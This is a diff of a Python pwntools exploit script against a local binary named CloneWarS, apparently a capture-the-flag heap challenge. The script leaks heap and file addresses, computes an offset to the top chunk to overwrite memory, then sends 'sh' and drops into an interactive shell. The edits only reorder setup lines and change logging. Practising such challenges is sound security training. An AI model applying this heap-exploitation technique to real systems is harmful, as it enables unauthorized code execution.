@@ -2,6 +2,13 @@
 from pwn import *
 import time
 
+binary = "./CloneWarS"
+elf=ELF(binary)
+p=process(binary)
+context.arch="amd64"
+print(p.recv())
+time.sleep(1)
+
 def starships(size, kind, capacity):
     #print(p.recv())
     time.sleep(1)
@@ -9,13 +16,7 @@ def starships(size, kind, capacity):
     p.sendline(str(size))
     p.sendline(kind)
     p.sendline(str(capacity))
-
-binary = "./CloneWarS"
-elf=ELF(binary)
-p=process(binary)
-context.arch="amd64"
-print(p.recv())
-time.sleep(1)
+    
 starships(0x30, 'A', 0x30)
 time.sleep(1)
 #print(p.recv())
@@ -25,14 +26,12 @@ print(resp)
 p.sendline("2")
 p.recvuntil('R2D2 IS .... ')
 HEAP_L = int(p.recvregex(r'(\d+) '))
-log.info('HEAP ADDR 0x%x'% HEAP_L)
 starships(0x30, "FF", 0x40)
 time.sleep(1)
 p.sendline("6")
 time.sleep(1)
 p.recvuntil('File is at: ')
 FILE = int(p.recvline().rstrip())
-log.info("FILE ADDR 0x%x" % FILE)
 print(p.recv())
 HEAP = HEAP_L-0x1380 # HEAPBASE
 SIZE_OF_LONG = 0x8 # sizeof(long) -> 8 in 64 bits
@@ -46,9 +45,11 @@ print(p.recv())
 p.sendline(str(FILE-TOP_CHUNK))
 time.sleep(.1)
 p.sendline("4")
+print(p.recv())
 time.sleep(.1)
 p.sendline("sh")
 time.sleep(.1)
 p.sendline("6")
 time.sleep(.1)
+print(p.recv())
 p.interactive()
